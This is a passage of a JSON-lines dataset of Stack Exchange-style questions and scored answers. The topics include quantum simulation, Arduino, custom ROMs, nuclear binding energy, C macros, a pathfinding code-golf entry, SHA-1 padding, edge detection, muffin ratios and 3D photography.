Otto\n", "score": 10}
{"title": "Is there an equivalent to derandomization for quantum algorithms?", "description": "With some randomized algorithms you can derandomize the algorithm, removing (at a possible cost in run time) the use of random bits and maximizing some lower bound on the objective (usually computed using the fact that the theorems are about the expected performance of the random algorithm). Is there an equivalent for quantum algorithms? Are there any well-known results of \"dequantization\"? Or is the underlying state space too big for this sort of technique?\n", "answer": "There are certain classes of quantum gates which can be simulated efficiently with a classical computer. If no entanglement is present, a computation with pure states (i.e. not random states) can be simulated efficiently. Classical gates reversible gates are a subset of quantum gates, and so can obviously be simulated efficiently. These two examples are pretty trivial, however there are a number of non-trivial gate sets known.\n\nValiant gates as mentioned in Joshua's answer\nClifford group gates (see arXiv:quant-ph/0406196)\nMatch gates (see arXiv:0804.4050)\nCommuting gates, etc.\n\nBasically, most sets of operators which generate only some small subspace of $SU(2^N)$ tend to be simulable, while any that generate $SU(2^N)$ are as hard as general quantum simulation of N qubits.\nIt seems very unlikely that quantum mechanics is efficiently simulable, and so such a dequantization program will likely be impossible in general. There is however a regime where this has worked, which is with interactive proofs. Several different kinds of interactive proof systems with quantum verifiers have been shown to have the same power if the quantum verifier is replaced with a purely classical verifier. For an example of this, see Jain, Ji, Upadhyay and Watrous's proof that QIP=PSPACE (arXiv:0907.4737).\n", "score": 15}
{"title": "What sort of things can an Arduino do?", "description": "Sorry for the question, I'm just starting out in robotics - as a hobby- and I was just interested in what I'll be able to actually do, please let me know, \n", "answer": "Arduino is very flexible.  You can do a lot of neat stuff with it.  It's one of the best tools for interfacing software to the real world.  However, it might be useful to also ask \"What can an Arduino not do?\".  Arduino has very limited memory and I/O compared to modern computers.  So some of the things the Arduino cannot do or cannot do easily are things that require a lot of memory or access to complex peripherals, like:\n\nvideo recording, processing & output\nhigh-fidelity audio recording & processing\nact as USB host for USB devices like flash drives, disk drives, cameras, keyboards, etc.\n\nSo, you can't easily make a video game system that hooks to your TV with an Arduino.  That doesn't mean people haven't done it, but that level of hacking is in the realm of deep voodoo, and the results still end up looking like a 1980s videogame.\nOften you see Arduino boards hooked up as peripherals to a larger computer.  The computer does the A/V and the Arduino handles all the other physical world interfacing.  Another common use is the fully embedded system where a more mundane device is made \"smart\" with a hidden Arduino. (\"Your coffee table now knows when you set cups on it and buzzes you if you don't use a coaster\")  This is where Arduino seems happiest.\n", "score": 14}
{"title": "What are the advantages of a custom ROM over rooted stock?", "description": "What can a custom ROM provide beyond rooting that I can't get by downloading an application?\n", "answer": "Advantages\nA custom ROM can be as little as a pre-rooted stock ROM, and with root you can do virtually anything. Thus the main advantage over just rooting is that the work has been done for you already if you grab a custom ROM with features you're interested in. For example, a custom kernel with better support for overclocking may be included in a custom ROM.\nAs the name implies, a ROM cooker has a lot of freedom to customize.  But, in general, the \"well known\" custom ROMs have:\n\nCustom themes, or at least wallpapers or widgets. This might include modified system colors and icons, startup screens, etc.\nRoot, of course (see the advantages of rooting).\nLess bloatware (e.g., removal of T-Mobile's \"My Account\").\nUseful utilities for the kind of person who flashes custom ROMs (e.g., ROM Manager).\nA mishmash of modems and kernels, selected for best battery life or performance.  Modems are usually stock but kernels may be stock or custom.\nAdditional options in menus (e.g., CyanogenMod allows a user to reboot to recovery or fastboot mode instead of just rebooting the device normally).\nAdditional user interface tweaks (e.g., CyanogenMod allows users to place on/off controls in the status bar instead of using widgets).\n\nFinally, custom ROMs don't have to be stock-based to begin with either. This might enable extra system-level features (built-in tethering, for example) or allow you to upgrade to a version of Android that hasn't been or won't be released for your device.  It can also free you from hard-to-remove bits of stock ROMs, such as their custom UIs / launchers that often cannot be removed.\nDisadvantages\n\nCustom ROMs, especially those not based on stock, are often a bit experimental.  They may not be as stable as stock, especially with custom kernels or when not stock-based (drivers are hard to get right).\nA custom ROM can include virtually any apps the creator wanted to include, and you may consider them bloatware.\nCustom themes may not be what you want; many ROM cookers aren't designers.\nSomething unsavory or malicious could be included in the ROM.\nBricking your device is always a possibility.  Make sure you know what you're doing when you flash a custom ROM, and never use a ROM designed for a different device.\nLike rooting, flashing a custom ROM will almost certainly void the warranty of a non-\"developer\" (e.g., Nexus) device.\n\n", "score": 18}
{"title": "Why is the nucleus of an Iron atom so stable?", "description": "Lighter nuclei liberate energy when undergoing fusion, heavier nuclei when undergoing fission.\nWhat is it about the nucleus of an Iron atom that makes it so stable?\nAlternatively: Iron has the greatest nuclear binding energy - but why?\n", "answer": "It all comes down to a balance between a number of different physical interactions.\nThe binding energy of a nucleus is commonly described with the semiempirical mass formula:\n$$E(A, Z) = a_V A - a_S A^{2/3} - a_C \\frac{Z(Z-1)}{A^{1/3}} - a_A \\frac{(A-2Z)^2}{A} + \\delta(A,Z)$$\nwhere $A = Z + N$ is the total number of nucleons, $Z$ the number of protons, and $N$ the number of neutrons.\nThe different contributions have physical explanation as:\n\n$a_V$ : volume term, the bigger the volume the more nucleons interact with each other through the strong interaction, the more they attract each other\n$a_S$ : surface term, similar to the surface tension, some energy stored in there, reducing the binding interaction\n$a_C$ : the Coulomb repulsion of the protons within the nucleus\n$a_A$ : asymmetry term, rooted in the Pauli exclusion principle. Basically if there are more of one type of nucleon (generally of neutrons) then the overall energy is larger than needs to be thus decreasing the binding energy (note: $A-2Z = Z - N$)\n$\\delta$ : pairing term, depends on whether there are even or odd number of nucleons altogether and even or odd number of protons/neutrons. In empirical description usually modeled as a continuous variable $a_P/A^{1/2}$.\n\nThis is of the expression for the total binding energy, what is interesting is the binding energy per nucleon, as a measure of stability:\n$$E(A, Z)/A \\approx a_V - a_S \\frac{1}{A^{1/3}} - a_C \\frac{Z(Z-1)}{A^{4/3}} - a_A \\frac{(A-2Z)^2}{A^2} + a_P \\frac{1}{A^{3/2}}$$\nTo see which nucleus (what value of $A$) is the most stable one has to find for which $A$ is this function maximal. At this point $Z$ is arbitrary but we should chose a physically meaningful value. From theoretical point of view a good choice is the $Z$ that gives the highest binding energy for a given $A$ (the most stable isotope), for which we need to solve solve $\\frac{\\partial (E/A)}{\\partial Z} = 0$. The results is $Z_{stable}(A) \\approx \\dfrac12\\dfrac{A}{1+A^{2/3} \\frac{a_C}{4 a_A}}$. After putting back the $Z_{stable}(A)$ into $E(A, Z)/A$ one can maximize the function value to get the \"optimal number\" of nucleons for the most stable element. Depending on the empirically determined values of $a_S, a_C, a_A, a_P$ the maximum will occur in the area $A \\approx 58 \\ldots 63$.\nThe interpretation of this result is something like this:\n\nfor small atoms (small $A$) the biggest contribution is the surface term (they have a large surface-to-volume ratio), and they want increase the number of nucleons to reduce it - hence you have fusion\nfor large atoms (large $A$) the Coulomb term increases because more protons mean more repulsion between them, and also, to keep everything together more neutrons are needed (thus $N \\gg Z$ which makes the asymmetry term larger as well. By ejecting some nucleons (alpha decay), or converting between neutrons and protons (beta decay) the nucleus can reduce this terms.\noptimally bound $A$ (and $Z$) happens when these two groups of competing contributions balance each others out.\n\n", "score": 39}
{"title": "How can I use an ETL?", "description": "I know that those letters mean Extract, Transform, and Load.\nBut, when I used it at first, I thought that during the Transform phase I could do plenty of different joins on data that I've extracted from data sources, later on I realized that doing a join on a different ETL is not that handy.\n\nSo what do we do in Transform phase ?\nCalculate and output the result ?\nString transformation?\nShould input data sources only be csv, xml or plain file?\nIf joins are not that handy, should we only do high level transformation within an ETL ?\n\nThank you\n", "answer": "Extract Transform and Load is the preparation of foreign data to be inserted into your database or data warehouse\nLooking at the basics of the ETL, noted Data Warehouse Designer Bill Inmon notes:\n\nOnce upon a time in the not so distant past, there was no ETL (extract, transform and load) software. If you wanted to build a data warehouse, you had to write code in order to get data from one source to the appropriate target. There was lots of code – lots of repetitive code.\nAfter you wrote your code, you had to maintain it. Every time a legacy system changed, you did manual maintenance to your code. Every time a target definition changed, you had to do manual maintenance to your code. Every time an end user wanted something new, you had to do maintenance to your code.\n\nFrom here, a plethora of ETL products proliferated, as Inmon describes in his brief history of ETL products. They were popular because they were software tools designed to extract data from changing systems, transform it according to specific rules, and load it into data warehouses. This software process meant that humans were involved only in the critical element of the loop: untangling loaded data errors. By automating to the maximum possible extent, the ETL process provided companies a seamless way of not only loading their current databases into a data warehouse, but the ability to load future data sets of the same databases in, so that the data warehouse can continuously provide future results.\nTo answer your question specifically, different databases provide different extracts. Transformations are applied to normalize the data. Normalization is both in the database-specific sense, changing the patterns of the data to match the receiving data warehouse, but also in the human sense, insuring that the same data in different systems appears the same to the incoming system.\nData sources can be anything you can code a transform for, as the purpose of the transform is to apply rules to the incoming data such that it fits your data model. Joining different data sets should only be performed if necessary. Rely on your recipient database instead to synchronize results.\n", "score": 11}
{"title": "What is the connection between Snow Crash and The Diamond Age?", "description": "I've heard that these two novels by Neal Stephenson take place in the same universe. \nWhat connections exist between the two novels and what is the time-line like?\n", "answer": "From Wikipedia:\n\nThe Diamond Age can be seen as set in the same universe as Snow Crash, many years later. This reading is based on a connection between Y.T., a major character in Snow Crash, and the aged neo-Victorian Miss Matheson in The Diamond Age, who drops oblique references to her past as a hard-edged skateboarder. This would set The Diamond Age some 80–100 years after Snow Crash.\nFurther supporting evidence to connect these two novels include:\n\nStephenson's short story \"The Great Simoleon Caper\" which refers to both the Metaverse seen in Snow Crash and the First Distributed Republic seen in The Diamond Age (another short story which fits in the Diamond Age milieu and even shares a character is \"Excerpt from the Third and Last Volume of Tribes of the Pacific Coast\").\nreferences to Franchise-Organized Quasi-National Entities (FOQNEs) in both novels.\n\nWhen taken as part of Snow Crash's timeline, The Diamond Age provides insight into the setting of its predecessor. In a conversation with Miranda, one character tells her that the nation-states of the world collapsed when electronic communications started using an untraceable relay system that made it impossible to enforce taxes on online transactions (which was later used as a plot element in another of Stephenson's works, Cryptonomicon). Deprived of their funding, large-scale governments collapsed, and small, voluntary governments like the burbclaves depicted in Snow Crash emerged in their place.\nBoth novels deal with an almost \"primitive tech\" replacing a current, worldwide use technology, in the sense of the reprogramming of the mind through ancient Sumerian chanting in Snow Crash (which also uses allusions to Babylonian prostitutes passing an information virus like a sexually transmitted disease), and the idea of nanotechnology propagating and communicating through sexual intercourse, passing from body to body like a virus. Both novels use an ancient, almost primitive threat to modern, \"Western\" technology and ideology (The Raft in Snow Crash and The Fists of Righteous Harmony in The Diamond Age). Stephenson explores the idea of the tech divide and its social and economic ramifications to the extreme using these violent, but not all together surprising, social revolutions.\n\n", "score": 38}
{"title": "abort() implementation", "description": "Here you go:\n#define abort(msg) (fprintf(stderr, msg) && *((char*)0))\n\n", "answer": "Non-standard interface to standard function\nThe obvious criticism of that implementation is that it has a different interface from what the C standard requires:\n\n§7.20.4.1 The abort function\nSynopsis\n#include <stdlib.h>\nvoid abort(void);\n\nDescription\nThe abort function causes abnormal program termination to occur, unless the signal\n  SIGABRT is being caught and the signal handler does not return. Whether open streams\n  with unwritten buffered data are flushed, open streams are closed, or temporary files are\n  removed is implementation-defined. An implementation-defined form of the status\n  unsuccessful termination is returned to the host environment by means of the function\n  call raise(SIGABRT).\nReturns\nThe abort function does not return to its caller.\n\nUnreliable implementation of 'crash'\nThere were systems, notoriously the DEC VAX, where accessing the memory at address 0 did not cause problems (until the programs that were written on the VAX were ported to other platforms that did abort).\nDereferencing a null pointer is undefined behaviour - that means anything could happen, including 'no crash'.\nNitpicks in implementation\nIf, for some reason, fprintf() returns 0, your program will not abort.  For example:\nabort(\"\");\n\ndoes not abort.  It is also dangerous to use the string as the format string; you should use:\n#define abort(msg) (fprintf(stderr, \"%s\\n\", msg) && *((char*)0))\n\nIt would be better to use a comma operator in place of the &&:\n#define abort(msg) (fprintf(stderr, \"%s\\n\", msg), raise(SIGABRT))\n\nSince the standard library could have defined a macro abort(), you should #undef it before defining it yourself.\n", "score": 16}
{"title": "Robot Finds Kitten", "description": "The challenge\nThe shortest code by character count to help Robot find kitten in the fewest steps possible.\nGolfers, this is a time of crisis - Kitten gone missing and it's Robot's job to find it! Robot needs to reach Kitten in the shortest path possible. However, there are a lot of obstacles in Robot's way, and he needs you to program a solution for him.\nRobot used to have a program do it for him, but that program was lost and Robot have no backup :(.\nRobot's runtime is not the best, and the least characters Robot has to read from the source code, the least time it will spend processing, and that means Kitten will be found faster!\nRobot's memory contains a map of the location he is currently in with the top representing North, bottom representing South, right representing East and left representing West. Robot is always in a rectangular room of an unknown size surrounded by walls, represented by # in his radar map. Areas Robot can walk in are represented by a space .\nRobot's radar also scans for many obstacles in the room and marks them in various ASCII letters. Robot cannot walk across those obstacles. The radar will mark Kitten as the special ASCII character K, while Robot's location is marked with R.\nRobot's navigation system works this way: He can understand a duo of direction and number of movement units he should travel to - for example, N 3 means 'go north 3 movement units'. Robot's radar map is made such that a movement unit is one ASCII character. Robot can only go in 4 directions and cannot travel diagonally.\nYour task, brave Kitten saver, is to read Robot's radar map once, and output the least amount of directions, with the least movement unit travel distance. Robot is guaranteed to have at least one path to Kitten.\nTo ensure Robot does not waste time executing a malfunctioning program that will not help Robot find Kitten, I encourage you, brave Kitten saver, to use this output of Robot's past program to ensure no time is wasted on finding Kitten!\nTest cases\nInput:\n    ######################\n    #  d      3    Kj    #\n    #                    #\n    # R                  #\n    #      q             #\n    ######################\nOutput:\n    E 13\n    N 2\n\nInput:\n    ######################\n    #  d  r   3    Kj    #\n    #    p        p      #\n    #         T        X #\n    #      q   s   t     #\n    #                    #\n    #  R o    d     W    #\n    #                    #\n    #    g      t     U  #\n    #                    #\n    ######################\nOutput:\n    N 1\n    E 10\n    N 4\n    E 2\n\nInput:\n    ######################\n    #  spdfmsdlwe9mw WEK3#\n    #    we    hi        #\n    #   rdf         fsszr#\n    #     sdfg  gjkti    #\n    #   fc  d g i        #\n    #     dfg    sdd     #\n    #    g        zfg    #\n    #  df   df           #\n    #             xcf   R#\n    ######################\nOutput:\n    N 1\n    W 9\n    N 5\n    E 4\n    N 1\n    E 4\n    N 1\n\nCode count includes input/output (i.e full program).\n", "answer": "C++ 1002 899 799chars\nNote requires the use of C++0x to eliminate the space between > > in templates.\nIt does find the route with the minimum number of turns.\n#include<iostream>\n#include<vector>\n#include<string>\n#include<set>\n#include<memory>\n#define D make_pair\n#define F first\n#define S second\nusing namespace std;typedef pair<int,int>L;typedef vector<L>R;typedef multiset<pair<float,pair<L,R>>>B;vector<string> M;string l;int z,c,r=0;set<L> s;B b;L n;B::iterator f;R v;void A(int x,int y,int w){n=f->S.F;for(c=1;(z=M[n.S+=y][n.F+=x])==32||(z==75);++c)v.back()=D(w,c),b.insert(D(f->F+c+1./c,D(n,v)));}int main(){for(;getline(cin,l);++r){if((c=l.find(82))!=string::npos)b.insert(D(0,D(D(c,r),R())));M.push_back(l);}while(!b.empty()){f=b.begin();n=f->S.F;v=f->S.S;if(M[n.S][n.F]==75)break;if(s.find(n)==s.end()){s.insert(n);v.push_back(L());A(0,1,83);A(0,-1,78);A(1,0,69);A(-1,0,87);}b.erase(f);}for(c=v.size(),r=0;r<c;++r)n=v[r],printf(\"%c %d\\n\",n.F,n.S);}\n\nIt Dijkstra's Algorithm for solving the shortest path problem.\nTo distinguish between multiple equal size routes a long straight line has less weight that multiple short lines (this favors routes with less turns).\nCost of a path:  Len + 1/Len\n\nLooking at Test Case 1:\n========================\nThus Path E13 + N2 has a cost of \n      13 + 1/13 + 2 + 1/2\nAn alternative path E9 + N2 + E4 has a cost of\n      9 + 1/9 + 2 + 1/2 + 4 + 1/4\n\nThe difference is\n      Straight Path:   1/13 <   Bendy Path: (1/9 + 1/4)\n\nIn a more readable form:\n#include<iostream>\n#include<vector>\n#include<string>\n#include<set>\n#include<memory>\n\nusing namespace std;\ntypedef pair<int,int>                   L;\ntypedef vector<L>                       R;\ntypedef multiset<pair<float,pair<L,R>>> B;\nvector<string>                          M;\n\nstring      l;\nint         z,c,r=0;\nset<L>      s;\nB           b;\nL           n;\nB::iterator f;\nR           v;\n\nvoid A(int x,int y,int w)\n{\n    n=f->second.first;\n    for(c=1;(z=M[n.second+=y][n.first+=x])==32||(z==75);++c)\n        v.back()=make_pair(w,c),\n        b.insert(make_pair(f->first+c+1./c,make_pair(n,v)));\n}\n\nint main()\n{\n    for(;getline(cin,l);++r)\n    {\n        if((c=l.find(82))!=string::npos)\n            b.insert(make_pair(0,make_pair(make_pair(c,r),R())));\n        M.push_back(l);\n    }\n\n    while(!b.empty())\n    {\n        f=b.begin();\n        n=f->second.first;\n        v=f->second.second;\n\n        if(M[n.second][n.first]==75)\n            break;\n\n        if(s.find(n)==s.end())\n        {\n            s.insert(n);\n            v.push_back(L());\n            A(0,1,83);\n            A(0,-1,78);\n            A(1,0,69);\n            A(-1,0,87);\n        }\n        b.erase(f);\n    }\n\n    for(c=v.size(),r=0;r<c;++r)\n        n=v[r],\n        printf(\"%c %d\\n\",n.first,n.second);\n}\n\n", "score": 10}
{"title": "The difference between Close price and Settelment Price for future contracts", "description": "What is the difference between Close price and Settlement Price for future contracts?\nIs there a defined rule for evaluating the settlement price or different rules are applied for each instrument/exchange?\nFor example the CME Emini S&P500(ES) or ICE Russell 2000(TF).\n", "answer": "Not really a quant question, but a quick search led to this from the CME: http://www.cmegroup.com/market-data/files/CME_Group_Settlement_Procedures.pdf. Unfortunately it depends on the contract, for example:\nEquity Futures: For S&P and NASDAQ, the settlement price of the lead* month contract is the midpoint of the closing range determined based on pit trading activity between 15:14:30-15:15:00 Central Time (“CT”). For all other equity indices, the Volume Weighted Average Price (VWAP) of trades executed on Globex between 15:14:30-15:15:00 CT is used to determine the settlement prices for the lead month contracts. Back month contract months are settled to traded or quoted spread relationships. E-mini S&P and Nasdaq are settled to the value derived from the Big S&P and Nasdaq.\nBasically, settlement price is important because futures accounts are marked to market every day. This means that gains and losses are offset and credited or debited to traders' accounts daily. This of course reduces risk of counterparty default. The closing price is usually considered the last price traded within trading hours and the settlement price is the official price of the contract used to mark traders' books to market.\n", "score": 10}
{"title": "Are \"files[]\" from custom_module.info not included on form submits?", "description": "I have a module that I am porting to Drupal 7 (specifically, Taxonomy Views Integrator) and there are 2 include files tvi.admin.inc which were included via the module's .info file:\nfiles[] = includes/tvi.admin.inc\nThe tvi.admin.inc houses the functions that the tvi.module's hook_form_alter() uses, including the validation & submit functions\nAlthough alterations made using the hook_form_alter() work properly, after submit the validation & submit functions in tvi.admin.inc are not available and throw an undeclared function error.\np.s.\nI've checked the initial issue for the extended .info module registry via:\nhttp://drupal.org/node/224333#registry and it does say the following which may provide us with an answer:\n\nFiles containing only functions need\n  not be listed in the .info file.\n\nAs a Workaround,\nI now use module_load_include() to load the tvi.admin.inc at the top of the tvi.module which, on form submit, still includes the inc and thus the validation / submit functions.\n", "answer": "Files listed in .info files are not automatically included when the module is loaded; they are loaded when a module tries to create an object for a class that PHP doesn't find. In that case, a callback registered with spl_autoload_register() will check the content of the Drupal registry to find which file needs to be loaded to allow the creation of the object.\nThe only way to load a file containing a function is to use module_load_include().\nIn the specific case, where the function to load is a form validation handler (or a form submission handler) that is added to a form altered with hook_form_alter() (or hook_form_FORM_ID_alter()), I would rather keep the form handlers in the same file containing the hook implementation. Technically, the file is loaded by hook_form_alter() when it is not necessary, as the form handlers are used after the form has been submitted; so far the code worked, but it is not said that it would not work in future versions of Drupal. \nDrupal 7 allows modules to implement hook_hook_info(), which is used from Drupal to know in which files the hook implementations are defined. The System module define its own implementation, which contains the following code:\nfunction system_hook_info() {\n  $hooks['token_info'] = array(\n    'group' => 'tokens',\n  );\n  $hooks['token_info_alter'] = array(\n    'group' => 'tokens',\n  );\n  $hooks['tokens'] = array(\n    'group' => 'tokens',\n  );\n  $hooks['tokens_alter'] = array(\n    'group' => 'tokens',\n  );\n\n  return $hooks;\n}\n\nWith this implementation of the hook, when Drupal is looking for the file containing the implementation of hook_tokens() for the module custom.module, it will look for the file custom.tokens.inc contained in the directory where the module custom.module is installed.\nThird-party modules are allowed to implement their own hook_hook_info(), but it should be remembered they are modifying where Drupal looks for the hook implemented by other modules too, which means that changing the group for hook_token_alter() changes the files where Drupal looks for any implementation of hook_token_alter().  \nIt is possible to use hook_hook_info() to keep some hooks in a file that is different from the module file, using an implementation similar to the following:\nfunction custom_hook_info() {\n  return array(\n    'form_alter' => array(\n      'group' => 'form',\n    ),\n  );\n}\n\nWhat I reported before is still valid; future versions of Drupal could stop working because they would not find where the form handlers are, even though they know where to find the implementation of hook_form_alter().\nThis is the reason I keep to put the implementation of hook_form_alter() (or hook_form_FORM_ID_alter()) and every related form handler in the module file.\n", "score": 16}
{"title": "Tracing user profile changes without iterating all the through?", "description": "Due to the project requirement, we want to trace the user profile property changes (made through mysite) whenever they do. \nIs it a good idea to insert a javascript (through a delegation control) and capture the page \"beforeUnload\" event. The \"beforeUnload\" function will call a \"generic handler\" with a current user login id and in which we can actually trace the profile changes using the class \"UserProfileChangeQuery\".\nor is there an event to override like itemupdating?\nor what would be the simplest method? \nalso does the class \"UserProfileChangeQuery\" return a updated information or the old data?\n", "answer": "Gary Lapointe and Mathew McDermott recently published an article on this topic in SharePointPro magazine.  It is available online here:\nhttp://www.sharepointpromag.com/article/sharepoint/monitor-sharepoint-user-profile-changes-129846\nSynopsis of the article:\nFirst you enable logging via the STSADM tool (no PS available for this)\nstsadm -o profilechangelog -userprofileapplication \"My User Profile Service App\" -daysofhistory 28\n\nYou gain access to the objects in Microsoft.Office.Server.UserProfiles namespace (which you are already aware of).\nThe UserProfileManager class contains the GetChanges method. \nThis method has three overloads:\n\nGetChanges(), which retrieves all changes\nGetChanges(UserProfileChangeToken), which retrieves all changes from \na given date or event\nGetChanges(ProfileBaseChangeQuery), which retrieves specific changes\ngiven a query object\n\nAll the GetChanges overloads return a UserProfileChangeCollection object. This object    contains all the changes stored as either a UserProfileChange object or one of its derivative types:\n\nUserProfileColleagueChange\nUserProfileCustomChange\nUserProfileLinkItemChange\nUserProfileMembershipChange\nUserProfileOrganizationMembershipChange\nUserProfilePropertyValueChange\nUserProfileWebLogChange\n\n", "score": 10}
{"title": "Should Selenium Automation Testers possess knowledge on Database concepts and to write queries in the script?", "description": "I am newbie to Test Automation.Currently I got an oppurtunity to work with selenium Web driver.I just want to know whether I need to learn Database like MYSQL,OR ORACLE to work with selenium.\nAlso I need to know whether any need comes if I need to create queries for making automation script more power full.?\n", "answer": "Strictly speaking you don't need to know how databases work to work with any automation tool. But without an understanding of databases and the ability to query them, you block off a large source of extra information you can use for validation. \nSome examples:\n\nYour application takes a person's name and contact details and stores them in three tables (for example: Customer, Address, Phone). You can verify that the correct information is stored by checking the database or by viewing the customer in the application - but if there's a problem, you won't know whether the failure is in reading the customer data or in saving it. If you check the database, you will know if the data saved correctly, if the address and phone records are properly linked to the customer record, and so forth.\nYour application allows you to delete records with child records. To validate that the record  was properly deleted, you really need to go into the database and make sure the child records are gone. In the customer example, you want to make sure that when the customer is deleted, their address and phone records are deleted as well.\nYour application uses the database to store transitional records such as temporary holds on items in a shopping cart. It's a lot easier to check that the transitional records are cleared when the transaction is cancelled than to try to validate through a GUI.\nYour application stores data in a specific format that doesn't match the GUI format. For instance, all dates & times could be stored in Universal Standard (Greenwich Mean) Time but displayed in the user's local system time. Without checking the database, it would be quite challenging to validate correct conversions.\nYour application makes calculations or rule evaluations on data stored in the database. In this case, the application could display everything correctly but reports be incorrect - with a database check you know where the problem is.\nYour application uses data in the database that is not surfaced in the application. \n\nThat's not a complete list but it's a starting point. I'd strongly recommend learning any database and query language (they're all very similar), because it will make your automation scripts more powerful and more accurate.\n", "score": 10}
{"title": "Why do we append the length of the message in SHA-1 pre-processing?", "description": "As we know, SHA-1 is irreversible, so why do we append the length of the message to the preimage?\n", "answer": "Wikipedia has a reasonably good explanation about the Merkle–Damgård construction. The idea is the following: SHA-1 is built around an internal \"compression function\" which takes as input the 160-bit state and a 512-bit message block, and returns a new state. The padding is designed so that it can be proven that a collision over the hash function necessarily implies at some point a collision in one of the calls to the compression function.\nFor instance, imagine that the padding merely consisted in appending zeros, up to the next block boundary. Then you could imagine getting a collision between a one-block message $m_1$ and a two-block message $m_2$, where the second block of $m_2$ is exactly $m_1$ (this would require the processing of the first block of $m_2$ to end up with exactly the initial state). In this case, there is no collision in the compression function per se.\nThis does not mean that the all-zero padding is weak; but the padding used in SHA-1 and other Merkle-Damgård schemes ensures that we can concentrate on the compression function alone, without taking into account multi-block messages: if we can \"prove\" the compression function to be collision-free, then so is the whole hash function. That's what the padding is for: to turn a collision-free compression function into a collision-free hash function.\n", "score": 17}
{"title": "What factors should I consider in choosing an edge detection algorithm?", "description": "I've learned about a number of edge detection algorithms, including algorithms like Sobel, Laplacian, and Canny methods. It seems to me the most popular edge detector is a Canny edge detector, but is there cases where this isn't the optimal algorithm to use? How can I decide which algorithm to use? Thanks!\n", "answer": "There are lots of edge detection possibilities, but the 3 examples you mention happen to fall in 3 distinct categories.\nSobel\nThis approximates a first order derivative. Gives extrema at the gradient positions, 0 where no gradient is present. In 1D, it is = $\\left[ \\begin{array}{ccc} -1 & 0 & 1 \\end{array} \\right]$\n\nsmooth edge => local minimum or maximum, depending on the signal going up or down.\n1 pixel line => 0 at the line itself, with local extrema (of different sign) right next to it. In 1D, it is = $\\left[ \\begin{array}{ccc} 1 & -2 & 1 \\end{array} \\right]$\n\nThere are other alternatives to Sobel, which have +/- the same characteristics. On the Roberts Cross page on wikipedia you can find a comparison of a few of them.\nLaplace\nThis approximates a second order derivative. Gives 0 at the gradient positions and also 0 where no gradient is present. It gives extrema where a (longer) gradient starts or stops.\n\nsmooth edge => 0 along the edge, local extrema at the start/stop of the edge.\n1 pixel line => a \"double\" extremum at the line, with \"normal\" extrema with a different sign right next to it\n\nThe effect of these 2 on different types of edges can be best viewed visually:\n\nCanny\nThis is not a simple operator, but is a multi-step approach, which uses Sobel as one of the steps. Where Sobel and Laplace give you a grayscale / floating point result, which you need to threshold yourself, the Canny algorithm has smart thresholding as one of its steps, so you just get a binary yes/no result. Also, on a smooth edge, you will likely find just 1 line somewhere in the middle of the gradient.\n", "score": 29}
{"title": "How to create a muffin recipe", "description": "I would like to experiment more with muffin recipes, but I don't want to stray too far and end up with inedible product. Are there basic parameters I should follow in creating my own muffin recipe? \nWhat makes a muffin a muffin, as opposed to a cupcake? \nWhat proportion of wet to dry ingredients should I use? \nWhat is a good method for converting one fruit/veggie ingredient to another? So if I have a great apple muffin recipe, how do I know how many berries to use instead? Or grated carrot or squash?\n", "answer": "Michael Ruhlman's Ratio defines a muffin as a form of a quick bread.  The basic quick bread ratio is:\n\n2 parts flour\n2 parts liquid\n1 part egg\n1 part fat\n\nSo you can make a muffin with those basic ingredients in about that ratio.  Remove any of those ingredients, and you no longer have a muffin.  Substantially change those ingredients, and you've moved somewhere else in the dough continuum or even towards a batter.\nPersonally I'd classify a cupcake as a type of cake.  The ratio for pound and sponge cake are both:\n\n1 part butter\n1 part sugar\n1 part egg\n1 part flour\n\nThe differences between cakes are often the mixing method - creaming versus foaming, for example.  You can see, though, that in a muffin your flour-to-fat ratio is higher than in a cake.  Muffins also don't require sugars.  Cakes and cupcakes do.\nFrom the basic quick bread ratio, you should be able to add any fruit or other ingredients (try bacon or turkey bacon), substitute in dry ingredients for flour such as bran or oatmeal (or another grain), and make a lot of other interesting changes.  Just make sure you stick to the basic proportion of a quick bread.  If you add a very wet ingredient, remove some liquid.  Change tastes by adjusting oil versus butter (or browning your butter).  Add sugar, baking powder or soda for leavening, spices, extracts, etc.\n", "question_score": "9", "answer_score": 14}
{"title": "How do I go about creating 3D photographs?", "description": "I've become fascinated by the realm of 3D photography and would like to try my hand at making some 3D images. I have several related questions:\n\nHow do I go about taking the dual images needed to make a 3D image?\nAre there any special distances that I need to keep in mind (either distances between cameras, or distances between camera and subject) in order to maintain the illusion?\nIs it possible to use newer viewing methods to see the picture? (e.g. the glasses that look like sunglasses you get at the movies or with your 3D television, as opposed to the glasses that have red and cyan lenses)\nWhat software can you recommend to prepare photographs for 3D viewing?\n\n", "answer": "The easiest way is to buy yourself a 3D camera.\nThis option has an excellent advantage: You can see the 3D effect while you compose and when reviewing your images which lets you know if the shot you take worked to give the 3D impression or not.\nOtherwise you have to take 2 nearly identical photos with slightly different viewpoints. There are three methods to do this:\n\nTake a photo, move the camera and take a second photo keeping everything constant: Focus, DOF, exposure, ISO, white-balance. This is easier to do with a camera with manual controls, although I suspect you can use Panorama Assist mode of compact-cameras too. They key is to move the camera along a level path a relatively small distance. The ideal distance between the two shots depends on focal-length, focus distance and desired perspective.\nTake two photos simultaneously: Get two identical cameras and set everything including focus distance and focal-length to exactly the same settings. Triggering them simultaneously using an IR remote is ideal. You can get away with mechanically triggering them if there are no movements in the scene. You can buy a dual tripod plate which can hold two cameras to help with this.\nUse an anamorphic 3D lens: These lenses capture two images side-by-side on your sensor. You need special software (supplied with cameras that support this lens) to transform the resulting image into an actual 3D image.\n\nThe distance between the two shots has to be such that the objects in the plane of focus appear slightly different but not too much. There is no ideal distance. The further the subject you are trying to focus on appears, the wider apart the pictures must be taken. This should take into consideration actual distance and focal-length, so longer a focal-length requires less movement between the shots.\nYou can view these images, which are actually stereoscopic images, by various means:\n\nMany new HDTV support 3D HDMI input which you can see using special glasses (not red-blue). Some display can also display the 3D effect without viewing glasses as long as you are standing with a certain distance and angle from the screen.\nYou can have your images on paper using lenticular printing services. See this question.\nGet a 3D Digital photo frame.\n\nThe software you need depends on your viewing device. If you have a 3D display device you have to make sure which format they use. So far, the MPO format is most popular, although Stereo JPEG (JPS) images exist. Fuji has software to convert between MPO and pairs of JPEGs. A number of free utilities exist but I have not much experience with them.\n", "question_score": "9", "answer_score": 13}
